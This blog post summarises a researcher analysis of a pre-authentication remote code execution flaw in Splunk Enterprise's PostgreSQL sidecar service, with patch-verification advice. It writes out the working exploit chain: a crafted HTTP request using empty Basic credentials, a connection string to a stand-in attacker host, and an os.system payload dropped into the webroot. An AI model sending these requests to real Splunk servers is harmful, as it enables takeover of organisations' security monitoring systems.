+++
title = "The SIEM That Lets You In: Splunk's Pre-Auth RCE"
date = "2026-06-18"
+++

When security researchers published an analysis of CVE-2026-20253, a pre-authentication RCE in Splunk Enterprise, it caught my attention immediately as someone who works with Splunk every day. The vulnerability lives inside the PostgreSQL Sidecar Service, an internal helper service added in recent versions.

## The initial advisory

Splunk's June 10 advisory signaled high severity: no authentication required, a CVSS score of 9.8, but no direct mention of code execution. That combination prompted watchTowr researchers to investigate the underlying mechanics.

Deployment scope was the first practical detail:

- Splunk Enterprise on Windows: sidecar not installed by default
- Splunk Enterprise on Linux (manual install): installed but disabled by default
- Splunk Enterprise on AWS: installed and enabled by default

The default AWS deployment was vulnerable out of the box. Splunk introduced the sidecar architecture in Splunk 10, affecting version 10 and above.

## Bypassing the loopback binding

The sidecar binary, `splunk-postgres`, binds to two loopback ports:

```text
tcp   LISTEN ... 127.0.0.1:5435    0.0.0.0:*    users:(("splunk-postgres",pid=4067,fd=12))
tcp   LISTEN ... 127.0.0.1:33669   0.0.0.0:*    users:(("splunk-postgres",pid=4067,fd=3))
```

Binding to `127.0.0.1` suggests the service is unreachable from the outside network, but internal services often proxy traffic to localhost. In this case, the main Splunk web application listening on port 8000 exposes internal reverse proxy routing.

The sidecar is a 66MB Go binary. Splunk documentation described a backup and restore workflow for the data management control plane, exposing parameters like `backupFile` and `database` under `/v1/postgres/` routes:

```text
/v1/postgres/telemetry
/v1/postgres/health
/v1/postgres/recovery/backup
/v1/postgres/recovery/restore
/v1/postgres/recovery/status/{id}
/v1/postgres/status
```

## Reaching the service remotely

The primary web application routes requests to the local sidecar API via the `__raw` path:

```http
POST /en-US/splunkd/__raw/v1/postgres/recovery/backup HTTP/1.1
Host: target
Content-Type: application/json
Authorization: Basic ***

{"database":"search_metadata","backupFile":"backuptest"}
```

Passing `Basic Og==` (base64 for an empty username and password `:`) satisfies the endpoint, as the sidecar accepted blank credentials. The response returned `200 OK` with state `BackupPending`, providing an unauthenticated primitive for arbitrary file creation and truncation through the web UI.

## Escalating to remote code execution

The exploit chain built by watchTowr leverages PostgreSQL features directly, because the `database` parameter acts as a full connection string:

1. Point the backup endpoint at an external PostgreSQL server: `database: "hostaddr=attacker.db.watchTowr.local"`. The sidecar connects out and pulls a prepared database dump.
2. Call the restore endpoint with a crafted connection string: `database: "dbname=template1 passfile=/opt/splunk/var/packages/data/postgres/.pgpass"`, where the `passfile` directive points to a target path.
3. The restore operation runs a function from the imported dump that writes a Python payload into the Splunk filesystem:

```python
# /opt/splunk/etc/apps/splunk_secure_gateway/bin/ssg_enable_modular_input.py
import os; os.system("id > /opt/splunk/share/splunk/search_mrsparkle/exposed/watchTowr.txt")
```

The resulting file appeared in the webroot, granting code execution under the Splunk service account.

## Practical lessons

Services bound to loopback are only as isolated as the applications running alongside them. If a public-facing web server proxies requests internally without strict route validation, localhost bindings offer little protection.

The fix requires the sidecar to validate and reject empty authentication tokens. Splunk patched the service, and testing whether the endpoint returns 400 or 401 provides a quick way to verify patch status.

Auxiliary components and bundled management services frequently expand attack surface in unexpected ways. In this case, a database management sidecar enabled by default in cloud images provided a direct path to compromising the SIEM itself.
